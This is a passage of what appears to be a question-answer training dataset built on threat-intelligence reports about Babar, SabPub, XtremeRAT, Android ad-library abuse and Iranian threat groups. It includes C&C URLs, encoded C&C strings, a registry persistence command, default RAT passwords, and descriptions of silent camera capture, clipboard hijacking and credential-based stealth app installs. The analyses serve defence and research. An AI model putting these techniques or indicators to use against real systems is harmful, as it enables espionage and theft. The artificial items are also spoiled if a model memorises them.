Babar leaves a visible process on the process list during execution.\nAs the project name 'Babar64' suggests, dropper and implant are designed to work on 32-bit and on 64-bit Windows versions. However, process hooking and injection can only affect 32-bit processes due to the bitness of the implant itself.\nBig Headline: 3. MISCREANT'S IMPLANT\nBabar's implant is a 32-bit DLL written in C++, which upon start injects itself to running processes and invades desktop applications by applying a global Windows hooks. The implant is capable of logging keystrokes, capture screen shots, spy on installed softphones and instant messengers next to a list of simpler espionage tricks. Babar is a fully blown espionage tool, built to excessively spy on the user's activity on an infected machine.\nThe DLL dropped by Babar is placed into the application data folder, along with a directory named 'MSI' where the runtime data will be stored. Babar operates through multiple instances, by injecting its DLL to a maximum of three desktop processes. This is achieved by loading the Babar DLL to remote processes through a mapped memory object.\nApart from that, Babar comes with a userland rootkit component which applies global Windows hooks to invade all processes on its desktop. This way Babar can install API hooks for various APIs via Windows Detours technique to actively steal data from arbitrary processes.\nMedium Headline: 3.1 ANTI-ANALYSIS MEASURES\nBabar's anti-analysis measures are sparse. It is not protected by a runtime packer or crypter, it does not have sandbox detection or anti-debugging measures, most character strings are shown in clear-text.\nBabar does show the same obscure treatment for installed anti-virus products as the Bunny malware though. Babar also enumerates the Windows Management Instrumentation for installed AV solutions, while the exact use of this information is not yet known. We do suspect large portions of the product enumeration to be based on the exact same source code as the module Bunny used.\nIllustration 2 | Querying anti-virus products installed on the machine\nThe enumeration function issues the commands \"SELECT * FROM AntiVirusProduct\" and retrieves attributes such as 'productState', 'DisplayName', 'VersionNumber' and 'productUptoDate'.\nThe anti-virus solutions searched for are again identified by 256-bit SHA hashes. Only some of the\nhashes could be mapped to known names of anti-virus solutions.\nBabar also implements an obfuscation technique to hide certain API names. Selected APIs are identified by hashes, which are used to load the APIs dynamically at runtime. The hashes are hardcoded within the binary, and will be compared to hashed library exports by the API resolution routine.\nThe hashing algorithm is different from the simple XOR/ROL technique Bunny uses. It seems to be based on SHA-1, but generates 32-bit hashes instead of the standard 160-bit length.\nWhat Bunny, Babar and NBOT all have in common though is that the obfuscation technique is easy to break and only applied to a subset of APIs. As an anti-analysis trick this is considerably useless, it does make sense though to trick malware detection solutions which apply heuristics based on static analysis of API calls. This becomes evident when looking at the list of Babar's obfuscated API names, which includes RegisterRawInputDevices, GetRawInputData, GetClipboardData or DirectSoundCaptureCreate.\nMedium Headline: 3.2 BABAR CAME TO STAY\nThe startup routine of the Babar implant will create a registry key under '[HKU]\\..\\CurrentVersion\\Run' to assure persistence. The key is named 'MSSecurity' and executes the exact same command line as the infector, every time the system boots - '\"regsvr32.exe\" /s /n /i \"%APPDATA%\\%DLLNAME%\"'. At system boot time the regsvr32.exe process will start, load the Babar DLL and thus 'deploy' the malware to various legitimate processes. As opposed to persistence, Babar also implements functionality to uninstall itself from the affected system.\nInteresting again, same as during infection, the regsvr32.exe process remains running even after Babar is readily set up.\nMedium Headline: 3.3 CONFIGURATION DATA\nDuring initialization Babar loads and decrypts a set of configuration parameters which are appended to the DLL's relocation section. ASCII strings within the configuration data reveal a lot about Babar's intentions:\n\u2022 Office executable names and associated document abbreviations excel.exe, winword.exe, powerpnt.exe, visio.exe, acrord32.exe, notepad.exe,\nwordpad.exe.txt, rtf, xls, xlsx, ppt, pptx, doc, docx, pdf, vsd\n\u2022 Softphone executable names skype.exe, msnmsgr.exe, oovoo.exe, nimbuzz.exe, googletalk.exe, yahoomessenger.exe, x-lite.exe\n\u2022 A version number\n12075-01 \u2022 Path and filename of the dump file %COMMON_APPDATA%\\MSI\\update.msi\n\u2022 Path to the runtime data directory %COMMON_APPDATA%\\MSI\n\u2022 Two C&C server domains and request parameters http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php http://www.gezelimmi.com/wp-includes/misc/bb/index.php\n\u2022 Web browser executable names, including MSN messenger iexplore.exe,firefox.exe,opera.exe,chrome.exe,Safari.exe,msnmsgr.exe\n\u2022 The name of the dropped implant perf_585.dll\nAs could be seen already in binaries of related families, next to the hardcoded configuration data Babar maintains a system specific runtime configuration. The additional configuration consists of a set of local attributes and a set of values derived from the Windows environment. The attributes are dynamically generated or requested at runtime and not stored in memory.\n%USERHASH% - Hash of the login name\n%USER% - Login name\n%SEQ% - Assumed to be the sequence number of dump files created by Babar\n%KID% - Assumed to be the ID of a subsequently infected process\n%ID% - Value retrieved from hardcoded configuration\n%SELFDIR% - Executable directory\n%SELF% - Executable name\nValues retrieved from Windows environment:\n%APPDATA%\n%USERPROFILE%\n%WINDIR%\n%COMMON_APPDATA%\n%ALLUSERPROFILE%\n%CommonProgramFiles%\n\nHow does the Babar malware reduce forensic artifacts post-infection, and what is the curious oversight in this process?",
    "output": "A: The Babar malware reduces forensic artifacts post-infection by executing a separate command line through spawning a cmd.exe process, which waits for 1 second before deleting the dropper binary on disk. However, the curious oversight in this process is that the regsvr32.exe process used to load the dropped implant remains running, leaving a visible process on the process list during execution.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: We can therefore confirm SabPub as APT in active stage.\nOn Sunday midday, the C&C domain was shutdown and the bot lost connection to it; this appears to be an initiative from the free DNS service onedumb.com and it was no doubt triggered by the media attention. Interestingly, the VPS used as the C&C is still active.\nWhile analysing SabPub, we discovered another version of the backdoor which seems to have been created earlier. This version differs from the original one only slightly -- the hardcoded C&C address is different --instead of the onedumb.com subdomain used by the original sample (hardcoded in the bot as \"e3SCNUA2Om97ZXJ1fGI+Y4Bt\"), this one simply contains the IP address of the VPS (hardcoded as \"OjlDLjw5Pi4+NUAuQDBA\"), meaning, it should still be operational. Its size is 42556 bytes vs 42580 for the original one.\nOne of the biggest mysteries is the infection vector of these attacks. Given the highly targeted nature of the attack, there are very few traces. Nevertheless, we found an important detail which is the missing link: Six Microsoft Word documents, which we detect as Exploit.MSWord.CVE-2009-0563.a. In total we have six relevant Word .docs with this verdict -- with four dropping the MaControl bot. The remaining two drop SabPub.\nThe most interesting thing here is the history of the second SabPub variant. In our virus collection, it is named \"8958.doc\". This suggests iit was extracted from a Word document or was distributed as a Doc-file.\nWe performed an analysis of the same and traced its origin by the MD5 (40C8786A4887A763D8F3E5243724D1C9). The results were fascinating:\n- The sample was uploaded to VirusTotal on February 25, 2012 \u2013 from two sources in the U.S.\n- In both cases, the original file name was \"10th March Statemnet\" (yes, with the typo and without extension)\n- Zero detections on VirusTotal at that time (0/40)\nIn case you are wondering, the name of the file (\"10th March Statemnet\") is directly linked with the Dalai-Lama and Tibetan community. On March 10, 2011, the Dalai-Lama released a special statement related to Anniversary of the Tibetan People's National Uprising Day -- hence the name.\nBig Headline: Properties field of a document used to spread SabPub\nUnfortunately there is little information in the doc files, but the Author field and the creation date are interesting. In particular, if we trust the creation date, this means the container DOC was created in August 2010 and it was updated in 2012 with the SabPub sample. This is quite normal for such attacks and we have seen it in other cases, for instance, Duqu.\nWe think the above facts show a direct connection between the SabPub and Luckycat APT attacks. We are pretty sure the SabPub backdoor was created as far back as February 2012 and was distributed via spear-phishing emails.\nIt is also important to point that SabPub isn't backdoor MaControl (the case was described (<http://labs.alienvault.com/labs/index.php/2012/ms-office-exploit-that-targets-macos-x-seen-in-the-wild-delivers-mac-control-rat/>)here) but still\nuses the same topics to trick victims into opening it. SabPub was the more effective attack because it remained undetected for almost two months!\nThe second variant of SabPub was created in March and the attackers are using Java exploits to infect target Mac OS X machines.\nSabPub is still an active attack and we expect the attackers will release new variants of the bot with new C2s over the next days/weeks.\nBig Headline: To summarize:\n- At least two variants of the SabPub bot exist today.\n- The earliest version of the bot appears to have been created and used in February 2012.\n- The malware is being spread through Word documents that exploit the (<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0563>)CVE-2009-0563 vulnerability.\n- SabPub is different from MaControl, another bot used in APT attacks in February 2012; SabPub was more effective because it stayed undetected for more than 1.5 months.\n- the APT behind SabPub is active at the time of writing.\n* Thanks to Aleks Gostev and Igor Soumenkov for the analysis.\n\nQuestion: What key differences exist between the two variants of the SabPub backdoor, and how does the second variant differ in terms of its infection method compared to the first?\n\nAnswer:",
    "output": "The two variants of the SabPub backdoor differ primarily in their hardcoded C&C addresses. The original sample uses a subdomain from onedumb.com (hardcoded as 'e3SCNUA2Om97ZXJ1fGI+Y4Bt'), while the second variant uses the IP address of the VPS directly (hardcoded as 'OjlDLjw5Pi4+NUAuQDBA'). The second variant is slightly smaller in size, 42556 bytes versus 42580 bytes for the original. Additionally, the second variant of SabPub was created in March and utilizes Java exploits to infect target Mac OS X machines, whereas the first variant was distributed via Word documents exploiting the CVE-2009-0563 vulnerability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: XtremeRAT\nThe XtremeRAT was developed by \"xtremecoder\" and has been available since at least 2010. Written in Delphi, the code of XtremeRAT is shared amongst several other Delphi RAT projects including SpyNet, CyberGate, and Cerberus. The RAT is available for free; however, the developer charges 350 Euros for the source code. Unfortunately for xtremecoder, the source code has been leaked online. The current version is Xtreme 3.6, however, there are a variety of \"private\" version of this RAT available as well. As such, the official version of this RAT and its many variants are used by a wide variety of actors.\nXtremeRAT allows an attacker to:\nInteract with the victim via a remote shell\nUpload/download files\nInteract with the registry\nManipulate running processes and services\nCapture images of the desktop\nRecord from connected devices, such as a webcam or microphone\nMoreover, during the build process, the attacker can specify whether to include keylogging and USB infection functions.\nBig Headline: Extracting Intelligence\nXtremeRAT contains two components: a \"client\" and a \"server\"; however, from the attacker's perspective, these terms have reversed meanings. Specifically, according to the author, the \"server\" component is the malware that resides on victim endpoints that connect to the \"client\", which is operated by the attacker\nfrom one or more remote command-and-control (CnC) systems. Due to this confusing and overloaded terminology, we refer to the \"server\" as a \"backdoor\" on the victim and the \"client\" as a remote \"controller\" operated by the attacker.\nXtremeRAT backdoors maintain and reference configuration data that was chosen by the attacker at the time they were built. This data can contain very useful hints to help group attacks and attribute them to actors, similar to what we have previously described in our Poison Ivy whitepaper. [3]\nSeveral versions of XtremeRAT write this configuration data to disk under\n%APPDATA%\\Microsoft\\Windows, either directly, or to a directory named after mutex configured by the attacker. When written to disk, the data is RC4 encrypted with a key of either \"CYBERGATEPASS\" or \"CONFIG\" for the versions we have analyzed. In both cases, the key is Unicode. The config file has either a \".nfo\" or \".cfg\" extension depending on the version. XtremeRAT's key scheduling algorithm (KSA) implementation contains a bug wherein it only considers the length of the key string, not including the null bytes between each character, as is found in these Unicode strings. As a result, it only effectively uses the first half of the key. For example, the key \"C\\x00O\\x00N\\x00F\\x00I\\x00G\\x00\" is 12 bytes long, but the length is calculated as only being 6 bytes long. Because of this, the key that is ultimately used is \"C\\x00O\\x00N\\x00\".\nThe configuration data includes:\nName of the installed backdoor file\nDirectory under which the backdoor file is installed\nWhich process it will inject into (if specified)\nCnC information\nFTP information for sending stolen keystroke data to\nMutex name of the master process,\nID and group name which are used by the actors for organizational purposes\nBecause the decrypted configuration data can be reliably located in memory (with only slight variations in its structure from version to version) and because not all versions of XtremeRAT will write their configuration data to disk, parsing memory dumps of infected systems is often the ideal method for extracting intelligence.\nWe are releasing python scripts we have developed to gather the configuration details for various versions of XtremeRAT from both process memory dumps and the encrypted configuration file on disk. The scripts are available at (<https://github.com/fireeye/tools/tree/master/malware/Xtreme%20RAT>)https://github.com/fireeye/tools/tree/master/malware/Xtreme%20RAT.\nAlso included in this toolset is a script that decrypts and prints the contents of the log file created by\nXtremeRAT containing victim keystroke data. This log file is written to the same directory as the config file and has a \".dat\" extension. Curiously, this log file is encrypted with a simple two-byte XOR instead of RC4. Later in this blog, we will share some of the configuration details we have extracted during our subsequent analysis.\nBig Headline: XtremeRAT Activity\nUsing telemetry from the FireEye Dynamic Threat Intelligence (DTI) cloud, we examined 165 XtremeRAT samples from attacks that primarily hit the following sectors:\nEnergy, utilities, and petroleum refining\nFinancial Services\nHigh-tech\nThese incidents include a spectrum of attacks including targeted attacks as well as indiscriminate attacks. Among these XtremeRAT-based attacks, we found that 4 of the 165 samples were used in targeted attacks against the High-Tech sector by threat actors we have called \"MoleRats\". [4]\nBig Headline: Operation Molerats\nIn 2012, XtremeRAT was used against a variety of governments as well as Israeli and Palestinian targets in what was known as Operation Molerats (the same attackers have also used variants of the Poison Ivy RAT). [5] Upon executing one particular sample (45142b17abd8a17a5e38305b718f3415), the malware beacons to \"test.cable-modem.org\" and \"idf.blogsite.org\". In this particular case, the attacker used XtremeRAT 2.9 within a self-extracting archive that also presents a decoy document to the victim, where the decoy content appears to have been copied from a website.\nFigure 4 shows the controller the attacker uses to interact with systems compromised with XtremeRAT. In this case, it appears the actor used the ID field to record the type of attack delivered (docx) and the Group field was used to record a \"campaign code\" (IDF), which helps the actor keep track of the set of victims that were attacked during this campaign.\nThe attacker modified the highlighted information at build time. By default, the XtremeRAT controller sets the ID field as \"Server\" and Group field as \"Servers\", with the default password used to authenticate, connect, and control a compromised endpoint as \"1234567890\".\nIn the Figure 5, the attacker specified custom CnC servers and ports and changed the default password to \"1411\". The attacker also changed the default process mutex name.\nBy default, the controller assigns a process mutex name of is \"\u2013((Mutex))\u2013\" and the attackers changed it to \"fdgdfdg\". These indicators along with command and control domain names and the IP addresses that they resolve to can be used to cluster and track this activity over time.\nThis is a cluster of Molerats activity. In addition to using the password \"1411\", the attackers are also using the password \"12345000\". This is a simple way to track the activity of these actors by using both passive DNS data and configuration information extracted from XtremeRAT.\nBig Headline: Spam Activity\nThe vast majority of XtremeRAT activity clustered around the default password \"1234567890\" (116 samples). There was overlap between this large cluster and the second largest one which used the password \"123456\" (12 samples). The activity in these two clusters aligns with indicators observed in Spanish language spam runs. The \"123456\" cluster also contains spam in the English language, leveraging the recent tragedy in Kenya as a lure. [7]\nBig Headline: The Uranio Cluster\nIn our sample set, we have 28 malware samples that connect to a set of sequentially numbered command\nand control servers:\nuranio.no-ip.biz\nuranio2.no-ip.biz\nuranio3.no-ip.biz\nuranio4.no-ip.biz\nuranio5.no-ip.biz\nuranio6.no-ip.biz\nuranio7.no-ip.biz\nplatino.no-ip.biz\nplatino-2.no-ip.biz\nplatino-4.no-ip.biz\nplatino-5.no-ip.biz\nplatino-8.no-ip.biz\nplatino-9.no-ip.biz\ncometa3.no-ip.biz\ncometa4.no-ip.biz\nThe malware is being spammed out and has file names such as:\nCertificaciones De Pagos Nominas Parafiscales jpg 125420215 58644745574455 .exe\nSoportes de pagos certificaciones y documentos mes mayo 30 2013 567888885432235678888888123456.exe\nCertificaciones De Pago Y Para Fiscales.exe\nWe extracted the configurations for a sampling of the XtremeRAT samples we came across in this spam run and found the following results:\n\"Server\", \"Servers\", and \"\u2013((Mutex))\u2013\" are the defaults in the XtremeRAT controller for ID, Group, and Mutex respectively. The random mutex names in the table above can be generated by double-clicking in the Mutex field within the controller. In most cases, the number at the end of the group label is the same number used at the end of the subdomain for the CnC. In the case of \"Uranio2011\", the subdomain is simply \"uranio\" and 2011 represents the port number used to communicate with the CnC infrastructure.\nBig Headline: Uranio Sinkhole Analysis\nWe sinkholed uranio2.no-ip.biz between November 22, 2013 and January 6, 2014. During that time, 12000 unique IPs connected to the uranio2.no-ip.biz. Recall, that this number reflects only one of many command and control servers. [8]\nHowever, estimating the number of victims this way is difficult due to DHCP lease times, which inflate the numbers, and NAT connections, which deflate the numbers. [9] As such, we counted the unique IP addresses that connected to the sinkhole on each day. The highest number of connections to this sinkhole was on Dec. 3, 2013 with 2003 connections and the lowest was Jan. 6, 2014 with 109 connections. The average number of unique IP addresses that connected to the sinkhole per day was 657.\nWhile these IP addresses were in ranges assigned to 40 distinct countries, the vast majority of the connections to the sinkhole (92.7 percent) were from Colombia. Argentina was a distant second with 1.22 percent, followed by Venezuela with 1.02 percent, Egypt with 0.95 percent and the U.S. with 0.9 percent.\n\nBased on the above text, answer a question. What are the primary functionalities of XtremeRAT that make it a versatile tool for attackers?",
    "output": "XtremeRAT allows an attacker to interact with the victim via a remote shell, upload/download files, interact with the registry, manipulate running processes and services, capture images of the desktop, and record from connected devices such as a webcam or microphone. Additionally, during the build process, the attacker can specify whether to include keylogging and USB infection functions, making it highly versatile for various types of cyber espionage and criminal activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Detonation with Android Context\nAs mentioned, it is more convenient to directly obtain the Android context via the\nJavascript bridge. Code in Listing 4, for example, is an easy way to get context from anywhere of the application.\nOperations like taking pictures and recording videos need to register Java callbacks. The attackers either need to boot a Java VM from the Javascript bridge, or to inject code into the host app's Java VM.\nFortunately, Android Runtime offers another way to load Java Native Interface (JNI) code into the host app using Runtime.load(). As shown in Listing 5, an attacker can load executables compiled from JNI code. Once loaded, the code can obtain context as described in Listing 4, or call DexClassLoaderload12 to inject new classes from the attackers' DEX files to register callbacks to take pictures/ record videos.\nListing 3: Dial numbers without user consent\n11 http://developer.android.com/guide/components/aidl.html.\n12 http://developer.android.com/reference/dalvik/system/DexClassLoader. html.\nThere are other ways to obtain Android context, like reflecting to the private static context variable of WebView13. However, without Java VM instances, it's difficult to take pictures and record videos. After our submission to Black Hat in April 2014, we noticed that MWR was also concurrently and independently working on this issue. They published a similar mechanism in June 201414.\nUsing these APIs, the attackers can monitor changes to a clipboard and transfer the clipboard contents to some remote server. They can also alter the clipboard content to achieve phishing goals. For example, the user may copy a link to visit and the background malicious service can change that link to a phishing site. We have notified Google about this issue.\nMedium Headline: Launcher Settings Modification\nAndroid Open Source Project  (AOSP)  classifies Android  permissions  into  several  protec- tion levels: \"normal,\"\"dangerous,\" \"system,\" \"signature\" and \"development\"15,16,17. Dangerous permissions\"may be displayed to the user and require confirmation before pro- ceeding, or\nand paste them into login forms. Malicious apps can steal the passwords if they can read the contents on clipboard. Android has no permissions restricting apps from accessing the global clipboard. Any UID has the capability to manipulate clipboard via the API calls in Listing 6:\nsome other  approach  may  be  taken  to  avoid the  user  automatically  allowing the use of such facilities.\"In contrast, normal permissions are automatically granted at installation, \"without asking for the user's explicit approval (though the user always has the option to review these\npermissions before installing)\"15. If an app requests both dangerous permissions and normal permissions, Android only displays the dangerous per- missions by default. If an app requests only normal permissions, Android doesn't display any permission to the user.\n13 http://www.weibo.com/p/1001603724694418249344?utm_source=weibolife.\n14 https://labs.mwrinfosecurity.com/blog/2014/06/12/putting-javascript- bridges-into-android-context.\n15 http://developer.android.com/guide/topics/manifest/permission-element.html.\n16 https://android.googlesource.com/platform/frameworks/base/+/master/ core/res/AndroidManifest.xml.\n17 https://android.googlesource.com/platform/packages/apps/Launcher2/+/ master/AndroidManifest.xml.\nWe have found that certain \"normal\" permissions have dangerous security impacts18. For example, the attackers can manipulate Android home screen icons using two normal permissions: launcher READ SETTINGS and WRITE SETTINGS permissions. These two permissions enable an app to query, insert, delete, or modify all launcher configuration settings, including icon insertion or modification.\nAs a proof-of-concept attack scenario, a malicious app with these two permissions can query/insert/ alter the system icon settings and modify legitimate icons of some security- sensitive apps, such as banking apps, to a phishing website.\nAfter our notification, Google has patched this vulnerability in Android 4.4.3 and has released the patch to its OEM partners. However, according to Google5, by 7 July 2014, 17.9% Android devices are using Android 4.4. Given that Android 4.4.2 and below has this vulnerability, over 82.1% Android devices are vulnerable.\nMedium Headline: Proxy  Modification\nWith  the  CHANGE WIFI STATE  permission,  Android  processes  can  change  the  proxy settings of WIFI networks (not solely the currently connected one).  To do this, the attacker can use the remote calls exposed by WifiManager to obtain the WifiConfiguration objects, then create new proxySettings to replace to a\ncorresponding field.  Note that the proxySettings field is a private Java field not intended to be accessed by other processes. Unfortunately, the flexible and powerful Java reflection mechanism (especially the forName(), getField(), setAccessible() calls) exposes such components to the attackers for arbitrary read or write operations.\nMedium Headline: Taking Pictures and Recording Audio/Video without User Interaction\nAndroid audio recording via the MediaRecorder APIs does not need user interaction or consent, which makes it easy to record sound in the background.\nOn the contrary, taking pictures and recording videos are more challenging. First, this requires registering Java callbacks. Second, Android warns that \"Preview must be started before you can take a picture\"19. It seems that taking pictures and recording videos without user notification is impossible. However, security largely depends on the correct implementation and enforcing a flawless implementation is difficult. On some of the popular phones (models anonymized for security consideration), startPreview() is required to take pictures/record videos; However, it's highly possible that on these devices takePicture() fails to check whether a view has been presented to the user. Fortunately, we have never witnessed a case where the MediaRecorder can shoot videos without calling setPreviewDisplay. But we were able to create and register a dummy SurfaceView to the WindowManager, which made taking photos and videos possible even on devices that properly checked for an existing preview.\n18 http://www.fireeye.com/blog/technical/2014/04/occupy_your_icons_ silently_on_android.html.\n19 http://developer.android.com/reference/android/hardware/Camera.html.\nMedium Headline: Stealthy A pp Ins tallatio n by A b u sin g Cre d e ntials\nWith both the GET ACCOUNTS and the USE CREDENTIALS permissions, Android pro- cesses can get secret tokens of services (e.g., Google services) from the AccountManager and use them to authenticate to these services20 .  We verified that Android apps with these two permissions can authenticate themselves with the user's Google account, allowing access to Google Play and the ability send app installation requests. Through the Javascript bridge, attackers can install apps of choice (e.g., an attacker's phishing app) to any devices registered in user's account in the background without user  consent.   Combined with the  launcher  modification attack  introduced earlier,  the attackers can redirect other app icons (e.g., bank or email app icons) to the phishing app and steal the user's login credentials.\nMedium Headline: Communication Channels Prone to Hijack\nIt is well known that communication via HTTP is prone to hijacking and data tamper- ing. Though ad libraries may not have the incentive to abuse users' private and sensitive data, this is not the\ncase with the attackers eavesdropping or hijacking the HTTP traffic. Switching to HTTPS may not solve this issue since the HTTPS security relies on a flawless implementation, which is difficult. For example, there are cases where the developer failed (intentionally or unintentionally) to check the server's certificate21. We found that some of the most popular ad libraries (see Table 3) have this issue. We successfully launched Man-in-the-Middle (MITM) attacks and intercepted the data uploaded to the remote server. Note that even if the ad libraries have a correct and rigorous implementation, the SSL library itself may contain serious vulnerabilities that can be exploited by MITM attacks22,23 .\n\nAnswer this question based on the above context: What are the security implications of 'normal' permissions in Android, specifically related to launcher settings modification, and how did Google address this vulnerability?",
    "output": "Certain 'normal' permissions in Android can have dangerous security impacts. For instance, the READ_SETTINGS and WRITE_SETTINGS permissions allow an app to query, insert, delete, or modify all launcher configuration settings, including icon insertion or modification. This can be exploited by a malicious app to alter system icon settings and redirect legitimate icons of security-sensitive apps to phishing websites. Google addressed this vulnerability by patching it in Android 4.4.3 and releasing the patch to its OEM partners. However, as of July 7, 2014, over 82.1% of Android devices were still vulnerable because they were running Android 4.4.2 or below.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Chapter 1: About This Document\nThis report is classified TLP: Amber.\nThe Traffic Light Protocol (TLP) was created in order to facilitate greater sharing of information. TLP is a set of designations used to ensure that sensitive information is shared with the appropriate audience.\n\uf06e TLP:Red: Recipients may not share TLP:RED information with any parties outside of the specific exchange, meeting, or conversation in which it was originally disclosed.\n\uf06e TLP:Amber: Recipients may only share TLP:AMBER information with members of their own organization, and with clients or customers who need to know the information to protect themselves or prevent further harm.\n\uf06e TLP:Green: Recipients may share TLP:GREEN information with peers and partner organizations within their sector or community, but not via publicly accessible channels.\n\uf06e TLP:White: Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction.\nFor additional information on the TLP, see http://www.us-cert.gov/tlp.\nMedium Headline: 2.1  Iranian Cyber Ecosystem\nThe Iranian cyber ecosystem is decentralized and fluid, with individual threat actors moving between cyber espionage groups and even undertaking cyber crime activity. Attacks are not infrequently outsourced to individual external contractors working within small corporate consultancies. This structure makes it difficult for researchers to definitively group threat actors and can offer the Iranian government plausible deniability for destructive attacks. In several cases, Symantec has seen threat actor groups share tools, infrastructure, targets, and tactics.\nThe tactics of Iranian threat actors have evolved from quick and relatively simple destructive attacks, such as distributed denial of service (DDoS) attacks or website defacements, to an increased focus on network compromises where the actors maintain a persistent foothold and obfuscate their presence to make attribution difficult. Iranian groups have increasingly targeted critical infrastructure including energy and telecommunications companies.\nIranian threat groups have also been tied to multiple destructive wiper attacks. Identifying potential targets for destructive attacks is particularly problematic because a change from espionage to destruction comes with limited warning if a threat group is already present on a network, as seen with Timberworm and Greenbug espionage operations facilitating the Shamoon destructive attacks beginning in late 2016.\nMedium Headline: 2.2  Key Observations\nConsidering the multitude of disparate groups operating and conducting cyber attacks against organizations around the globe, there is not a single trait that defines them. The following are some key observations from tracking these groups:\n\uf06e During recent years, actor groups operating out of Iran have honed their skills at an unprecedented scale, being able to victimize Fortune 500 organizations along with their public sector counterparts.\n\uf06e The groups appear to be unconcerned with attacks being publicly attributed to them.\n\uf06e Aside from Greenbug and Shamoon having worked together, most of the different groups seldom work in tandem; they seem to mostly be independent of each other, working under organizational mandates which do not often intersect.\n\uf06e In the early years, the groups appeared motivated to conduct DDoS attacks against financial institutions, with the aim of attempting heists, but those attacks have not been seen for several years.\n\uf06e Groups such as Elfin, Crambus, Seedworm, Chafer, Tortoiseshell, and others are motivated to conduct espionage by attacking:\n\u2013 Private sector: Telecommunication providers, transportation (air and marine) entities, defense contractors, oil and natural gas companies, and those in their supply chain.\n\u2013 Public sector: Military intelligence, diplomatic missions, think tanks, and defense ministries.\n\uf06e Some of the groups have no reservations in conducting destructive attacks, rendering computing equipment unusable.\n\uf06e Several groups make extensive use of dynamic DNS services while conducting attack campaigns.\n\uf06e At least two of the groups have shown a proclivity towards using DNS as a communication channel between victimized computers and the malware's control infrastructure, that is DNS tunneling. This functionality has been observed across both IPv4 and IPv6.\n\uf06e The two most widely used methods of infiltrating a target's network remain:\n\u2013 Spear phishing using topical themes with embedded scripts that invoke PowerShell to download additional components.\n\u2013 Publicly documented vulnerabilities such as those in VPN and web servers.\n\uf06e All groups rely on public or open-source tools (Mimikatz, LaZagne, and so on) to conduct their campaigns; the only differing factor amongst the groups is the degree of reliance.\n\uf06e There appear to be several hacktivists that conduct uncoordinated attacks, like site defacements, as a sign of patriotism. These are unpredictable and opportunistic, so details have been left out of this document.\nMedium Headline: 2.3  Outlook\nGiven the history of attacks originating from Iran, it is evident the groups consider destruction of equipment as an acceptable form of damage to targets. However, to date these incidents have only targeted Middle Eastern entities. Iranian actors have not shown an appetite for conducting similar attacks against Western organizations. Considering the tense geopolitical climate in 2020 and based on previous Iranian activity, we believe cyber attacks originating from Iran or Iranian proxies would be (in order of descending probability):\n\uf06e Wipers being used for destructive attacks against critical infrastructure\n\uf06e Infrastructure for telecommunication providers being attacked to disrupt services\n\uf06e Hacktivist defacements of popular websites\n\uf06e DDoS attacks against financial entities\nTo date, most Iran originating actor groups, other than Greenbug and Shamoon, operated with only a small degree of collaboration. We suspect a coordinated attack campaign is more likely in 2020 but organizing such an attack is likely to take time.\nMedium Headline: 3.1  Shamoon\nShamoon has received a lot of public attention since it first appeared in August 2012 and used the malware family (<https://www.symantec.com/security_response/writeup.jsp?docid=2012-081608-0202-99>)W32.Disttrack in its attacks against two Middle Eastern oil and natural gas organizations. The attacks were destructive in nature, wiping out critical data from computers and rendering them unusable.\nThe malware used by this group leveraged a legitimate driver to wipe machines, and subsequently reported wiping statistics to a command and control (C&C) server.\nIn both attacks from 2012, and those subsequently seen towards the end of 2016, hard-coded network credentials were configured into the malware, which assisted its spreading across the network. These credentials (<https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon>)were acquired and likely (<https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon>)shared by Greenbug, allowing Shamoon the ability to execute its attack.\nTable 1:  Activity Timeline on Computer During 2016 Shamoon Attack\nCredentials were likely stolen a month prior to the attackers' return to use common legitimate tools to dump additional information from the victim network before deploying Disttrack.\nMedium Headline: 3.2  Dustman/ZeroCleare\nIn December 2019, IBM X-Force (<https://www.ibm.com/downloads/cas/OAJ4VZNJ>)publicly wrote about a wiper malware it came across and named ZeroCleare based on PDB strings within the malware. This malware is an evolution of Disttrack, used in the Shamoon incidents. The authors updated the malware logic but retained the underlying logic of utilizing the Eldos driver to overwrite the MBR and partitions. The attackers used a vulnerable VirtualBox driver to bypass security controls and eventually use the Eldos driver to gain direct access to the raw hard disk and conduct their wiping operation.\nSymantec automatically detected and blocked this piece of malware in July 2019, which appears closer to the date of compilation of the malware in June 2019.\nIn January 2020, the (<https://www.scribd.com/document/442225568/Saudi-Arabia-CNA-report>)National Cybersecurity Authority of Saudi Arabia released a report about a wiper malware they called Dustman based on the file name used during an attack campaign. Dustman is a further evolution of ZeroCleare, where the authors optimized functionality into a single file instead of the methods used in the June/July campaigns.\nSmall Headline: 3.3.1  Case Study 1\nIn June 2019, Elfin sent out a phishing email to hundreds of recipients across multiple countries in what could be deemed an opportunistic trawling attack. The link within the document led recipients to dynamic DNS infrastructure controlled by the attackers. (<>)Figure 1 is a screenshot of the email sent.\nFigure 1:  Screenshot of Email Sent by Elfin\nAs Symantec observed email activity across numerous sectors and regions, it appeared likely that Elfin was conducting a widespread email campaign with enticing lures to hook high-value targets at multiple organizations, rather than targeting specific industries.\n\nWhy is it challenging to identify potential targets for destructive attacks by Iranian threat groups, and what historical examples illustrate this challenge?",
    "output": "Identifying potential targets for destructive attacks by Iranian threat groups is challenging because a change from espionage to destruction can occur with limited warning if a threat group is already present on a network. Historical examples include the Timberworm and Greenbug espionage operations facilitating the Shamoon destructive attacks beginning in late 2016. These incidents highlight how espionage activities can transition to destructive attacks without much notice.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What methods did Seedworm use to gain access to victims' networks and perform lateral movement in the case study from April to June 2019?",
    "output": "Seedworm used phishing emails with attached Microsoft Word documents containing malicious macros to gain access to victims' networks. Upon compromising a target system by installing the Powermud v2 backdoor, Seedworm ran a tool to steal passwords saved in users' web browsers and email. They also used open-source tools such as LaZagne and Crackmapexec to obtain Windows authorization credentials. For lateral movement, Seedworm employed a vulnerability scanner to search for Microsoft Server Message Block (SMB) remote code execution vulnerabilities on other computers in the compromised subnet, as described in security update MS17-010.",
